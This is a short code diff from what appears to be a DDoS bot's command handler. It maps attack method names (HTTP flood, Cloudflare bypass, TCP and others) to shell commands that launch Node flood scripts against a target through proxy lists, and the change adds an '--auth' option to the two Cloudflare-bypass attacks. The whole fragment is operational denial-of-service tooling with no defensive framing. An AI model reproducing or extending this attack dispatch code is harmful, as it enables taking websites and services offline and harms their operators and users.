@@ -37,9 +37,9 @@ def on_message(command):
         elif method == "HTTPFLOOD":
             final_cmd = f"node httpddos.js {target} {time_at} 4 4 proxies.txt"
         elif method == "BYPASSCF_V1":
-            final_cmd = f"node bypass.js GET {target} {time_at} 2 2 proxies.txt --debug --full --connect"
+            final_cmd = f"node bypass.js GET {target} {time_at} 2 2 proxies.txt --debug --full --connect --auth"
         elif method == "BYPASSCF_V2":
-            final_cmd = f"node bypassv2.js GET {target} {time_at} 2 2 proxies.txt --debug --full --connect --ratelimit-bypass"
+            final_cmd = f"node bypassv2.js GET {target} {time_at} 2 2 proxies.txt --debug --full --connect --ratelimit-bypass --auth"
         elif method == "BRS":
             final_cmd = f"node brs.js {target} {time_at} 2 2 proxies.txt --debug true --threads 1 --flooder true"
         elif method == "TCP":
